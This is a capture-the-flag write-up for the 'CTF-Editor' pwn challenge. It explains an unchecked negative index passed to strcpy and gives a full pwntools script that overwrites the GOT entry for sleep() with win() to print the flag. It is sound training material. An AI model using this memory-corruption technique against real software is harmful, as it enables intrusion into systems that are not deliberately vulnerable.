# CTF-Editor

Author: v10l3nt

## Description

We built a CTF category editor to help with the religious debate over CTF categories. Hopefully this debate never ends.

0.cloud.chals.io:22354

## Overview

The binary is vulnerable to partial overwrite into the PLT due to `strcpy()` allowing the user to write anywhere in memory.

`strcpy(&categories + (long)category * 0xf,new_name);`

There is no bounds checking on the value of `(long)category` which allows for a user to input a number that will write outside the bounds of `&categories`.

By overwriting the PLT entry of `sleep()` to the address of `win()`, when `sleep()` is called after sending a category name of `recon`, the `win()` function will be called and it will print the flag.

The reason that `sleep()` must be used, is because we cannot overwrite any of the other functions, because doing so would cause a SIGSEGV due to an invalid address for those functions.

## Solution

```python
from pwn import *
import math

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b vuln
c
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 22354)
    else:
        return process('./ctf_editor')

p = start()

# Overwrite exit to call win()

win = e.sym['win']
cat = e.sym['categories']
ext = e.got['sleep']

offset = str(math.ceil((cat - ext)/15))
overwrite = b'A'*int(15*(int(offset) - (cat - ext)/15)) + p64(win)

p.recvuntil(b'>>> ')
p.sendline(b'Y')
p.recvuntil(b'>>> ')
p.sendline(b"-"+offset.encode('utf-8'))
p.sendline(overwrite)

p.recvuntil(b'>>> ')
p.sendline(b'Y')
p.recvuntil(b'>>> ')
p.sendline(b'1')
p.recvuntil(b'>>> ')
p.sendline(b'recon')

p.interactive()
```

